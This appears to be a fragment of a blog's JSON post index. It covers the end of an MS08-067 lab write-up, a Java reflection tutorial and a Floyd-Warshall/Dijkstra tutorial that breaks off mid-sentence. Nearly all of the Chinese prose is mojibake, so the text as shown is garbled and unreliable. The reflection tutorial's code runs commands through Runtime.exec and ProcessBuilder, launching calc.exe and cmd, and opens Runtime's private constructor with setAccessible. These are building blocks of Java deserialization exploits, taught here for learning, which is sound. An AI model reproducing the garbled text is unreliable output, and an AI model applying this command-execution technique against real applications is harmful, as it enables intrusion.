#\rä¸Šè¿°æµ‹è¯•ç¯èŠ‚ä¸­\næœ‰ä¸€äº›åŒªå¤·æ‰€æ€çš„ç¯èŠ‚\næ¯”å¦‚è¯´å…³é—­é˜²ç«å¢™ï¼Œå¼€å¯ä»€ä¹ˆä»€ä¹ˆæœåŠ¡ç­‰ç­‰\nçœ‹ä¼¼æ¯”è¾ƒç¹ç\nå…¶å®ms08-067æœ€åˆæ˜¯åœ¨2008å¹´å‡ºç°\né‚£æ—¶å€™è¿˜æ²¡æœ‰é’ˆå¯¹è¿™ä¸ªæ¼æ´çš„è¡¥ä¸\næ‰€ä»¥å½“æ—¶æ¥è¯´åº”è¯¥æ˜¯ä¸éœ€è¦è¿™ä¹ˆç¹ççš„ğŸ¤”\nè¿™ç¯‡æ–‡ç« ä¹Ÿåªæ˜¯ç®€å•çš„å¤ç°ä¸€ä¸‹æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹\nä¹‹åä¼šå¼€è¾Ÿä¸€ä¸ªæ–°çš„åˆ†ç±»æ¥ä¸“é—¨æ”¶å½•è¿™äº›æ¼æ´çš„å­¦ä¹ å’Œåˆ©ç”¨\nç°åœ¨ï¼Œwindows XPçš„æ¯”ä¾‹è¿˜æ˜¯å æœ‰1.26%å·¦å³ï¼Œå¤§çº¦æœ‰2520ä¸‡å°ç”µè„‘ä¸Šè¿˜æ˜¯XPç³»ç»Ÿ\nå°±ç®—æƒ³åˆ©ç”¨è¿™ä¸ªæ¼æ´æç‚¹åŠ¨ä½œï¼Œå¤§éƒ¨åˆ†çš„XPåº”è¯¥ä¹Ÿæ˜¯æ‰“è¿‡è¿™ä¸ªè¡¥ä¸çš„\nä½†æ˜¯ä¹Ÿä¸æå€¡åœ¨ç°å®ä¸­è¿›è¡Œæ¼æ´æ”»å‡»\næ¯•ç«Ÿå®¹æ˜“è¢«èœ€é»è¯·å»å–èŒ¶ğŸ˜°\nè¿˜æ˜¯è€å®åœ°åœ¨è™šæ‹Ÿæœºé‡Œå­¦ä¹ å§\n","date":"2023-08-10","externalUrl":null,"permalink":"/posts/2023/08/ms08-067-review/","section":"Posts","summary":"","title":"MS08-067æ¼æ´æµ‹è¯•","type":"posts"},{"content":"\rä»€ä¹ˆæ˜¯åå°„ï¼Ÿ #\råœ¨Javaä¸­ï¼Œåå°„æ˜¯æŒ‡ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–ç±»ä¿¡æ¯ã€æ„é€ å¯¹è±¡ã€è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å±æ€§çš„èƒ½åŠ›ã€‚\næ¢å¥è¯è¯´ï¼Œåå°„ä½¿å¾—ç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶æ£€æŸ¥å’Œæ“ä½œä»»æ„ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡ã€æ–¹æ³•å’Œæ„é€ æ–¹æ³•ï¼Œè€Œä¸éœ€è¦åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šä¸‹æ¥ã€‚\nè¿™é‡Œå°±ç®€å•å­¦ä¹ ä¸€ä¸‹å¦‚ä½•é€šè¿‡åå°„è¾¾åˆ°æ‰§è¡Œå‘½ä»¤\nå…ˆçœ‹ä¸€è¡Œç®€å•çš„ä»£ç ï¼š\nRuntime.getRuntime().exec(command); //commandæ˜¯éœ€è¦è¿è¡Œçš„å‘½ä»¤ åœ¨ Java ä¸­ï¼Œjava.lang.RuntimeÂ æ˜¯ä¸€ä¸ªè¡¨ç¤ºè¿è¡Œæ—¶ç¯å¢ƒçš„ç±»ï¼Œå®ƒæä¾›äº†ä¸Javaè™šæ‹Ÿæœºçš„è¿è¡Œæ—¶äº¤äº’çš„æ–¹æ³•ã€‚\nRuntimeåˆ™æ˜¯java.lang.Runtimeçš„ä¸€ä¸ªå•ä¾‹æ¨¡å¼ï¼Œé€šè¿‡è°ƒç”¨Runtime.getRuntime()ï¼Œå¯ä»¥è·å–åˆ°å½“å‰è¿è¡Œç¯å¢ƒçš„å®ä¾‹ï¼Œå†é€šè¿‡execå‡½æ•°è¿›è¡Œæ‰§è¡Œå‘½ä»¤\nä»€ä¹ˆæ˜¯å•ä¾‹ï¼Ÿï¼šå¯ä»¥ç†è§£ä¸ºè¿‡ä¸€æ¡æ²³åªéœ€è¦æœ€å¼€å§‹å»ºé€ ä¸€åº§æ¡¥å°±å¤Ÿäº†ï¼Œè€Œä¸æ˜¯æ¯æ¬¡è¿‡æ¡¥éƒ½å»å»ºé€ ä¸€åº§æ¡¥\nè€ŒJVM å’Œè¿è¡Œæ—¶ç¯å¢ƒä¹‹é—´åªæœ‰ä¸€æ¡è¿æ¥ï¼Œå› æ­¤Runtimeæ˜¯å•ä¾‹çš„\nä¿®æ”¹ä¸€ä¸‹ä»£ç ï¼Œæ”¾å…¥ideaä¸­è¿è¡Œä¸€ä¸‹ï¼š\nRuntime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); å°±èƒ½å¼¹å‡ºç”µè„‘è‡ªå¸¦çš„è®¡ç®—å™¨ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å¼¹å…¶ä»–çš„cmdã€powershellç­‰ç­‰\né‚£ä¹ˆåœ¨Javaä¸­ï¼Œè¾ƒä¸ºé‡è¦çš„æ–¹æ³•ï¼š\nè·å–ç±»çš„æ–¹æ³•ï¼š forName\nå®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼š newInstance //è°ƒç”¨é»˜è®¤çš„æ— å‚æ„é€ å™¨\nè·å–å‡½æ•°çš„æ–¹æ³•ï¼š getMethod\næ‰§è¡Œå‡½æ•°çš„æ–¹æ³•ï¼š invoke\nè·å–ç±»çš„æ–¹æ³•ï¼šè¿™é‡Œçš„ç±»æ˜¯æŒ‡java.lang.Classçš„å¯¹è±¡ï¼Œè€ŒéæŸä¸ªå®ä¾‹\nobj.getClass() å¦‚æœå‰åå­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹objï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è¯¥å®ä¾‹è°ƒç”¨å‡½æ•°æ¥è·å¾—å®ä¾‹çš„ç±»\nè€Œ Class.forName ä¸é€šè¿‡å®ä¾‹è·å–ç±»ä¸åŒçš„æ˜¯ï¼Œåªéœ€çŸ¥é“è¿™ä¸ªç±»çš„åå­—å°±å¯ä»¥ï¼Œè€Œä¸”æ–¹ä¾¿çš„æ˜¯ï¼Œé€šè¿‡forNameè·å–éç³»ç»Ÿç±»å¹¶ä¸éœ€è¦é€šè¿‡import\nåŸºæœ¬æ€è·¯ #\ré‚£ä¹ˆå¦‚ä½•é€šè¿‡åå°„æ¥è·å¾—Runtimeç±»å‘¢ï¼Ÿ\nç»“åˆæ–‡ç« å¼€å¤´çš„é‚£ä¸€è¡Œä»£ç ï¼Œå¯ä»¥å‘ç°ä½¿ç”¨Runtimeç±»æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åŸºæœ¬æ€è·¯ï¼š\né¦–å…ˆè‚¯å®šè¦è·å–åˆ°Runtimeç±»çš„å®ä¾‹ï¼Œè¿™æ ·æ‰èƒ½è°ƒç”¨getRuntime\nç„¶åè°ƒç”¨ç±»é‡Œçš„getRuntimeå‡½æ•°æ¥è·å–å½“å‰è¿è¡Œç¯å¢ƒçš„å®ä¾‹\næœ€åè°ƒç”¨execï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nåŸºæœ¬ä»£ç ğŸ‘‡\nimport java.lang.reflect.Method;\rpublic class Main {\rpublic static void main(String[] args) throws Exception{\rClass c=Class.forName(\u0026#34;java.lang.Runtime\u0026#34;);\rMethod getRuntime=c.getMethod(\u0026#34;getRuntime\u0026#34;);\rObject obj=getRuntime.invoke(c);\rMethod m=c.getMethod(\u0026#34;exec\u0026#34;, String.class);\rm.invoke(obj,\u0026#34;calc.exe\u0026#34;);\r}\r} ç®€å•åœ°çœ‹çœ‹è¿™æ®µä»£ç å§ï¼Œä¸ºäº†æ–¹ä¾¿çœ‹ï¼ŒæŠŠæ¯ä¸€æ­¥éƒ½åˆ†å¼€äº†\né¦–å…ˆé€šè¿‡Class.forNameæ‹¿åˆ°Runtimeç±»ï¼Œä½†æ˜¯è¿™æ—¶cå¹¶ä¸æ˜¯ä¸€ä¸ªRuntimeç±»çš„å®ä¾‹\nç„¶åæˆ‘ä»¬è¦è·å–åˆ°getRuntimeå‡½æ•°ï¼Œè¿™é‡Œç”¨äº†getMethodæ–¹å¼é€šè¿‡å‡½æ•°åç§°å°±èƒ½è·å¾—å‡½æ•°ï¼Œå› ä¸ºcçš„å±æ€§å¹¶ä¸æ˜¯Runtimeï¼Œå³ä½¿methodä¸ºå…¬æœ‰é™æ€ä¹Ÿæ— æ³•é€šè¿‡cæ¥è·å–\nç„¶åå°±åˆ°äº† obj è¿™ä¸€æ­¥ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸€æ­¥ï¼ŸåŸå› å°±åœ¨äºRuntimeæ˜¯å•ä¾‹çš„ï¼Œå…¶æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæ— æ³•é€šè¿‡å¤–éƒ¨æ¥è¿›è¡Œæ„é€ ï¼Œåªèƒ½é€šè¿‡cæ¥ä½¿ç”¨getRuntimeå‡½æ•°æ¥è¿”å›ä¸€ä¸ªRuntimeç±»ï¼Œä½¿å¾—objå˜ä¸ºRuntime\nç›¸å½“äº Object obj -\u0026gt; Runtime obj\nå¯ä»¥æœ¬åœ°è°ƒè¯•ä¸€ä¸‹ğŸ‘‡\næ­¤æ—¶objçš„å±æ€§å°±æ˜¯Runtimeï¼Œä¹Ÿå°±æ˜¯è¯´æˆåŠŸè·å–äº†ä¸€ä¸ªRuntimeç±»çš„å®ä¾‹\nç„¶åå†é€šè¿‡è¿™ä¸ªRuntimeç±»æ¥è°ƒç”¨execå‡½æ•°å³å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå¼¹ä¸ªè®¡ç®—å™¨ğŸ‘‡\nå½“ç„¶ä¹Ÿå¯ä»¥å¼¹ä¸ªcmdğŸ‘‡\nå…³äº invoke å‡½æ•°çš„ä½¿ç”¨\ninvoke(Object obj, Object\u0026hellip; ï¼Œargs) æ˜¯method ç±»ä¸­çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªnativeæ–¹æ³•\nobj: è°ƒç”¨ç±»çš„å®ä¾‹å¯¹è±¡\nargs:è°ƒç”¨å‘æ–¹æ³•çš„å‚æ•°ï¼Œæ˜¯å¯å˜é•¿åº¦çš„\né€šè¿‡ method.invoke(obj , args ) å¯ä»¥å®ç°method æ–¹æ³•çš„è°ƒç”¨ï¼Œå¹¶é€šè¿‡args å‚æ•°ä¼ å‚\næœ‰ç‚¹ç±»ä¼¼äºå€’è£…çš„å½¢å¼å“ˆï¼Œä»¥ä¸ºä¸»ä½“è°ƒç”¨å¯¹è±¡\nä¸¤ä¸ªé—®é¢˜ #\rå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ ï¼Œä¹Ÿæ²¡æœ‰å•ä¾‹æ¨¡å¼çš„é™æ€æ–¹æ³•ï¼Œå¦‚ä½•é€šè¿‡åå°„å®ä¾‹è¯¥ç±»ï¼Ÿ\nå¦‚æœä¸€ä¸ªæ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œèƒ½å¦æ‰§è¡Œï¼Ÿ\nå¯¹äºä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªæ–°çš„åå°„æ–¹æ³• getConstructorï¼Œä»åå­—å°±èƒ½çœ‹å‡ºæ¥ï¼Œget constructorï¼Œæ‹¿åˆ°æ„é€ å™¨ï¼Œç„¶åä½¿ç”¨ProcessBuilderè¿™ä¸ªç±»æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ ï¼Œä¹Ÿä¸æ˜¯å•ä¾‹\n_#ProcessBuilderç±»ï¼š_ç”¨äºåˆ›å»ºå’Œç®¡ç†å­è¿›ç¨‹çš„ç±»ï¼Œæä¾›äº†ä¸€ç§æ–¹ä¾¿çš„æ–¹å¼æ¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤æˆ–å¯åŠ¨å…¶ä»–åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªç±»ä¸­å¸¸ç”¨çš„æ–¹æ³•ï¼š\nstart()ï¼šå¯åŠ¨å­è¿›ç¨‹å¹¶è¿”å›ä¸€ä¸ªÂ ProcessÂ å¯¹è±¡ã€‚\ncommand(String... command)ï¼šè®¾ç½®è¦æ‰§è¡Œçš„å‘½ä»¤æˆ–åº”ç”¨ç¨‹åºã€‚\nä»£ç å¦‚ä¸‹ğŸ‘‡\nimport java.lang.reflect.Constructor;\rimport java.lang.reflect.Method;\rimport java.util.Arrays;\rimport java.util.List;\rpublic class Main {\rpublic static void main(String[] args) throws Exception{\rClass c=Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;);\rConstructor cons=c.getConstructor(List.class);\rMethod m=c.getMethod(\u0026#34;start\u0026#34;);\rProcessBuilder p=(ProcessBuilder) cons.newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;));\rm.invoke(p);\r}\r} é¦–å…ˆé€šè¿‡forNameè·å–åˆ°ProcessBuilderè¿™ä¸ªç±»\nç„¶åé€šè¿‡getConstructorè·å–åˆ°ä»–çš„æ„é€ å‡½æ•°ï¼Œå¹¶å°†æ„é€ å‡½æ•°çš„å‚æ•°æŒ‡å®šä¸ºåˆ—è¡¨å½¢å¼\nç„¶åè¦è·å¾—Processç±»çš„å¯åŠ¨å‡½æ•°start\næœ€åä½¿ç”¨è·å–åˆ°çš„constructoræ¥å®ä¾‹åŒ–ProcessBuilderï¼Œè¿›è€Œstartæ‰§è¡Œå‘½ä»¤\næ¥çœ‹çœ‹ProcessBuilderè‡ªå¸¦çš„æ„é€ å‡½æ•°ğŸ‘‡\né™¤äº†Listå½¢å¼ä¼ å…¥å‚æ•°ï¼Œè¿˜æœ‰ä¸€ä¸ªç›´æ¥ä¼ å…¥å­—ç¬¦ä¸²å½¢å¼\nå°±ç¬¬äºŒç§å½¢å¼è€Œè¨€ï¼Œæ‹¬å·å†…çš„å‚æ•°æ˜¯ String . . . è¿™ç§å½¢å¼ï¼Œå…¶å®å°±ç›¸å½“äº String[ ]\næƒ³è¦é€šè¿‡ä¼ å…¥å­—ç¬¦ä¸²çš„è¯ï¼Œä»£ç å°±è¦è¿™æ ·ä¿®æ”¹ğŸ‘‡\nimport java.lang.reflect.Constructor;\rimport java.lang.reflect.Method;\rimport java.util.Arrays;\rimport java.util.List;\rpublic class Main {\rpublic static void main(String[] args) throws Exception{\rClass c=Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;);\rConstructor cons=c.getConstructor(String[].class);\rMethod m=c.getMethod(\u0026#34;start\u0026#34;);\rProcessBuilder p=(ProcessBuilder) cons.newInstance((Object) new String[]{\u0026#34;cmd\u0026#34;,\u0026#34;/c\u0026#34;,\u0026#34;start\u0026#34;,\u0026#34;cmd\u0026#34;});\rm.invoke(p);\r}\r} æœ‰ç‚¹å·®å¼‚çš„å°±æ˜¯åœ¨newInstanceé‡Œé¢\nnewçš„String[ ]å…¶å®æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„\nè€ŒnewInstanceæœ‰ä¸¤ç§é‡è½½æ¨¡å¼ï¼Œå¦‚æœæœ‰å‚æ•°çš„è¯è¿™ä¸ªå‚æ•°å¿…é¡»æ˜¯å¯¹è±¡\næ‰€ä»¥åœ¨ä»£ç ä¸­è¦è¿›è¡Œç±»å‹è½¬æ¢\né‚£ä¹ˆç¬¬äºŒä¸ªé—®é¢˜ï¼Œå¦‚ä½•è°ƒç”¨ç§æœ‰æ–¹æ³•ï¼Ÿ\nè¿™ä¸ªé—®é¢˜å°±æ¶‰åŠåˆ°äº† getDeclaredç³»åˆ—çš„åå°„\ngetDeclaredä¸getMethodã€getConstructorçš„åŒºåˆ«ï¼š\ngetMethodåªèƒ½è·å¾—å…¬æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬è‡ªèº«å’Œç»§æ‰¿è€Œæ¥çš„æ–¹æ³•\ngetDeclaredMethodç³»åˆ—çš„è¯ï¼Œä»åå­—å°±èƒ½çœ‹å‡ºï¼Œèƒ½è·å¾—å£°æ˜è¿‡çš„æ–¹æ³•ï¼Œä½†ä»…é™äºæœ¬ç±»ï¼Œä¸åŒ…æ‹¬ç»§æ‰¿\nä½¿ç”¨æ–¹æ³•çš„è¯éƒ½å¤§å·®ä¸å·®\nä¸Šé¢è¯´è¿‡ï¼ŒRuntimeè¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œåœ¨ä¸Šé¢åªèƒ½é€šè¿‡getRuntimeå‡½æ•°æ¥è¿”å›ä¸€ä¸ªRuntimeç±»\né‚£ä¹ˆå¦‚æœä½¿ç”¨getDeclaredï¼Œä»£ç ğŸ‘‡\nimport java.lang.reflect.Constructor;\rpublic class Main {\rpublic static void main(String[] args) throws Exception{\rClass clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;);\rConstructor m = clazz.getDeclaredConstructor();\rm.setAccessible(true);\rclazz.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(m.newInstance(), \u0026#34;calc.exe\u0026#34;);\r}\r} é¦–å…ˆè‚¯å®šè¦è·å¾—Runtimeç±»\nç„¶åé€šè¿‡getDeclaredConstructoræ¥è·å–Runtimç±»çš„æ— å‚æ„é€ \nè¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªsetAccessbileçš„æ–¹æ³•ï¼Œä»¥ä¸ºRuntimeçš„æ„é€ æ˜¯ç§æœ‰çš„ï¼Œéœ€è¦é‡æ–°è®¾ç½®ä»–çš„ä½œç”¨åŸŸï¼Œå¦åˆ™æ˜¯ä¸èƒ½è°ƒç”¨çš„\nç„¶åå°±èƒ½ç›´æ¥é€šè¿‡constructoræ¥newinstanceï¼Œæ•ˆæœå’Œé€šè¿‡ç±»æ¥newinstanceæ˜¯ä¸€æ ·çš„\nä¸è¿‡è¿™æ®µä»£ç åœ¨æˆ‘ç”µè„‘ä¸Šè·‘ä¸èµ·æ¥ï¼Œå¯èƒ½æ˜¯jdkç‰ˆæœ¬çš„åŸå› ï¼Œåœ¨setAccessibleè¿™é‡ŒæŠ¥äº†é”™è¯¯ï¼Œä¸è¿‡ä»£ç åº”è¯¥æ˜¯æ²¡æœ‰é—®é¢˜çš„\nå­¦ä¹ å‚è€ƒï¼š\nã€ŠJavaå®‰å…¨æ¼«è°ˆã€‹-åå°„ç¯‡\n","date":"2023-07-27","externalUrl":null,"permalink":"/posts/2023/07/java-reflection/","section":"Posts","summary":"","title":"Java-åå°„","type":"posts"},{"content":"","date":"2023-07-27","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"2023-07-17","externalUrl":null,"permalink":"/categories/algorithm/","section":"Categories","summary":"","title":"Algorithm","type":"categories"},{"content":"","date":"2023-07-17","externalUrl":null,"permalink":"/tags/%E7%AE%97%E6%B3%95/","section":"Tags","summary":"","title":"ç®—æ³•","type":"tags"},{"content":"åœ¨ä¹‹å‰çš„æ–‡ç« å†™è¿‡ä¸¤ç§æœç´¢æ–¹å¼\næ·±åº¦ä¼˜å…ˆæœç´¢ and å¹¿åº¦ä¼˜å…ˆæœç´¢\nç„¶åç”¨è¿™ä¸¤ç§æœç´¢æ–¹å¼æ¥è§£å†³äº†å›¾çš„ä¸€äº›é—®é¢˜\nè¿™é‡Œå­¦ä¹ å‡ ç§æ–°çš„ç®—æ³•\nFloyd-Warshall #\rç®€å•äº†è§£ä¸€ä¸‹ğŸ‘‡\nä»‹ç»ï¼šFloyd-Warshallç®—æ³•æ˜¯æœ‰Floydäº1962å¹´æå‡ºï¼Œå…¶å¯ä»¥è®¡ç®—æœ‰å‘å›¾ä¸­ä»»æ„ä¸¤ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ï¼Œæ­¤ç®—æ³•åˆ©ç”¨åŠ¨æ€è§„åˆ’çš„æ€æƒ³å°†è®¡ç®—çš„æ—¶é—´å¤æ‚åº¦é™ä½ä¸º O(v^3) ã€åœ¨è¿™é‡Œæˆ‘å°±ç®€ç§° FWç®—æ³• äº†ğŸ˜‹\nåŠ¨æ€è§„åˆ’æ˜¯åé¢çš„é—®é¢˜äº†ï¼Œå…ˆäº†è§£ä¸€ä¸‹è¿™ä¸ªç®—æ³•çš„é€»è¾‘å°±å¥½\nå…ˆæ¥ä¸€ä¸ªæœ‰å‘å›¾ğŸ‘‡\næ ¹æ®ä»¥å¾€çš„ç»éªŒï¼Œè¦æ±‚ä¸¤ä¸ªç‚¹çš„è·ç¦»å˜çŸ­ï¼Œåªèƒ½å¼•å…¥ç¬¬ä¸‰ä¸ªç‚¹\næ¯”å¦‚ aâ†’b å¼•å…¥é¡¶ç‚¹kï¼Œåˆ™å˜ä¸º aâ†’kâ†’b\næ¯”è¾ƒå¼•å…¥å‰åçš„è·ç¦»å¤§å°ï¼Œæ¥åˆ¤æ–­è¿™ä¸ªç‚¹æ˜¯å¦å¼•å…¥æœ‰æ•ˆï¼Œæœ‰æ•ˆåˆ™æ›´æ–°æœ€çŸ­è·¯å¾„\nè¯·ç»“åˆä¸Šå›¾ï¼Œé¡¶ç‚¹ 1 åˆ°é¡¶ç‚¹ 3ï¼Œå¼•å…¥é¡¶ç‚¹ 2 åˆ™å¾—åˆ°æœ€çŸ­è·¯å¾„\nä¸è¿‡æœ‰çš„æ—¶å€™å¯èƒ½è¦å¼•å…¥çš„ä¸æ­¢ä¸€ä¸ªç‚¹ï¼Œè€Œæ˜¯ä¸¤ä¸ªç‚¹ï¼Œä¸‰ä¸ªç‚¹â€¦â€¦\næ¯”å¦‚è¯´å›¾ä¸Šçš„é¡¶ç‚¹ 4 åˆ°é¡¶ç‚¹ 3ï¼Œè¦å¼•å…¥é¡¶ç‚¹ 1 ã€é¡¶ç‚¹ 2 ï¼Œæ‰èƒ½å¾—åˆ°æœ€çŸ­è·¯å¾„\nå†™ä»£ç æ—¶ï¼ŒåŒæ ·ä¹Ÿè¦å½•å…¥å›¾å’Œè¾¹\nä»¥ä¸‹æ ‡ä»£è¡¨é¡¶ç‚¹ï¼Œå€¼ä»£è¡¨è¾¹é•¿\nåŸºäºè¿™ç§å¼•å…¥ç‚¹çš„æ€æƒ³ï¼Œå†™å‡ºä¸€ä¸ªä»£ç æ¨¡å‹ğŸ‘‡\nfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (a[i][j] \u0026gt; a[i][1] + a[1][j])\ra[i][j] = a[i][1] + a[1][j];\r}\r} ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬ä»¥é¡¶ç‚¹ 1 ä¸ºå¼•å…¥ç‚¹ï¼Œæ¥è·å¾—å…¶ä½™ç‚¹çš„æœ€çŸ­è·ç¦»\nå½“ç„¶ï¼Œå¦‚æœè¦è·å¾—å…¨éƒ¨ç‚¹çš„æœ€çŸ­è·ç¦»ï¼Œé‚£å°±å¾—æŠŠæ‰€æœ‰ç‚¹éƒ½å¼•å…¥ä¸€é\næ•´ä½“ä»£ç å¦‚ä¸‹ğŸ‘‡\n#include\u0026lt;stdio.h\u0026gt;\tint n, m;\rint a[51][51];\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = 99999999;//å‡è®¾æ— ç©·è¿œ\r}\r}\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y, dis;\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;x, \u0026amp;y, \u0026amp;dis);\ra[x][y] = dis;//æœ‰å‘å›¾è¿™æ ·å†™\r}\r//FWç®—æ³•æ ¸å¿ƒä»£ç å°±è¿™ä¸‰ä¸ªå¾ªç¯åµŒå¥—\rfor (int k = 1; k \u0026lt;= n; k++)\r{\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (a[i][j] \u0026gt; a[i][k] + a[k][j])\ra[i][j] = a[i][k] + a[k][j];\r}\r}\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i != j)\r{\rprintf(\u0026#34;%d åˆ° %d çš„æœ€çŸ­è·ç¦»æ˜¯ %d\\n\u0026#34;, i, j, a[i][j]);\r}\r}\r}\rreturn 0;\r} okï¼Œæ¥å…·ä½“å‰–æä¸€ä¸‹ä»£ç \nå¼•å…¥ä¸€ä¸ªç‚¹çš„æ—¶å€™å¥½ç†è§£å§\né‚£ä¹ˆå¼•å…¥å¤šä¸ªç‚¹çš„æ—¶å€™ï¼Œå¦‚ä½•æ¥ç†è§£ä»£ç å‘¢ï¼Ÿ\næ‹¿ä¸Šé¢é‚£ä¸ªå›¾çš„é¡¶ç‚¹ 4ï¼Œåˆ°é¡¶ç‚¹ 3ï¼Œæ¥ä¸¾ä¾‹å­\nå¾ˆæ˜æ˜¾é¡¶ç‚¹ 4 åˆ°é¡¶ç‚¹ 3çš„ç›´çº¿è·ç¦»ä¸º 12ï¼Œè¦å¼•å…¥é¡¶ç‚¹ 1å’Œ2ï¼Œè¿™åº”è¯¥çœ‹ä¸¤çœ¼å°±èƒ½å¾—å‡ºçš„ç»“è®º\nä½†æ˜¯è®¡ç®—æœºä¸ä¼šçœ‹ï¼Œåªèƒ½æ‰§è¡Œä»£ç \né¦–å…ˆï¼Œé¡¶ç‚¹ 4 åˆ°é¡¶ç‚¹ 1çš„æœ€çŸ­è·ç¦»æ˜¯èƒ½æ±‚çš„å§ï¼Œç”¨FWç®—æ³•èƒ½å¾—å‡ºè·ç¦»æ˜¯5\nç„¶åé¡¶ç‚¹ 4 åˆ°é¡¶ç‚¹ 2çš„æœ€çŸ­è·ç¦»ä¹Ÿæ˜¯èƒ½æ±‚çš„ï¼ˆå¼•å…¥ç‚¹ 1ï¼‰ï¼Œå¾—å‡ºæ˜¯7\né‚£ä¹ˆè¦æ±‚é¡¶ç‚¹ 4åˆ°é¡¶ç‚¹ 3çš„æ—¶å€™ï¼Œå°±å°è¯•ä»¥å¦å¤–å‡ ä¸ªç‚¹ä¸ºè·³æ¿å¼•å…¥\nå…¶å®æœ€åå®é™…ä¸Šæ±‚å¾—çš„æ˜¯ä»é¡¶ç‚¹ 4 åˆ°é¡¶ç‚¹ 3ï¼Œä»¥é¡¶ç‚¹ 2 ä¸ºå¼•å…¥ç‚¹è·å¾—çš„çš„æœ€çŸ­è·ç¦»\nå…¶ä»–çš„ç‚¹ä»¥æ­¤ç±»æ¨ï¼Œæ ¸å¿ƒä»£ç å°±æ˜¯ä¸‰ä¸ªåµŒå¥—çš„forå¾ªç¯ï¼Œæœ€å¤–å±‚ä¸ºå¼•å…¥ç‚¹ï¼ˆè·³æ¿ï¼‰ï¼Œå†…éƒ¨ä¸ºæ¯”è¾ƒ\nDijkstra #\råå­—å¥‡å¥‡æ€ªæ€ªçš„ã€‚ã€‚ã€‚\nè¿™éƒ¨åˆ†å­¦ä¹ ä¸€ä¸ªæŒ‡å®šä¸€ä¸ªç‚¹åˆ°å…¶ä½™å„ç‚¹çš„æœ€çŸ­è·¯å¾„ï¼Œä¹Ÿå«åšâ€œå•æºæœ€çŸ­è·¯å¾„â€\nä¾‹å¦‚æ±‚ä¸‹å›¾çš„ 1 å·é¡¶ç‚¹åˆ°å…¶ä½™å„ç‚¹çš„æœ€çŸ­è·¯å¾„ğŸ‘‡\nå’Œä¸Šé¢çš„FWç®—æ³•ä¸€æ ·ï¼Œè¿˜æ˜¯ç”¨äºŒç»´æ•°ç»„å‚¨å­˜ç‚¹å’Œè¾¹çš„å…³ç³»\nä¸è¿‡è¦å¦å¤–å¼€ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œæ¥å‚¨å­˜æŒ‡å®šç‚¹å’Œç›®æ ‡ç‚¹çš„è·ç¦»\nè¿™é‡Œä»¥é¡¶ç‚¹ 1ä¸ºæŒ‡å®šç‚¹ï¼Œæ±‚åˆ°å…¶ä»–ä¸ªç‚¹çš„æœ€çŸ­è·ç¦»\né‚£ä¹ˆå¼€ä¸€ä¸ªæ•°ç»„ï¼Œå…ˆè¿›è¡Œæ¨¡ç³Šå‚¨å­˜\nç›®å‰disæ•°ç»„ä¸­çš„æ•°æ®éƒ½æ˜¯ä¼°è®¡å€¼\ndis[2]=1ï¼Œåˆ™è¯´æ˜ä»é¡¶ç‚¹ 1 åˆ°é¡¶ç‚¹ 2 çš„æ¨¡ç³Šè·ç¦»ä¸º1ï¼ˆæ˜¯ç›´æ¥åˆ¤æ–­çš„ä¸¤ç‚¹ä¹‹é—´çš„è·ç¦»ï¼Œå¹¶æ²¡æœ‰ç»è¿‡ç¬¬ä¸‰ç‚¹ï¼‰ï¼Œä¸¤ç‚¹æ— æ³•ç›´è¾¾åˆ™é»˜è®¤ä¸ºæ— é™è¿œ\né‚£ä¹ˆç°åœ¨ï¼Œdis[2]å°±æˆä¸ºäº†ä¸€ä¸ªç¡®åˆ‡å€¼ï¼Œå› 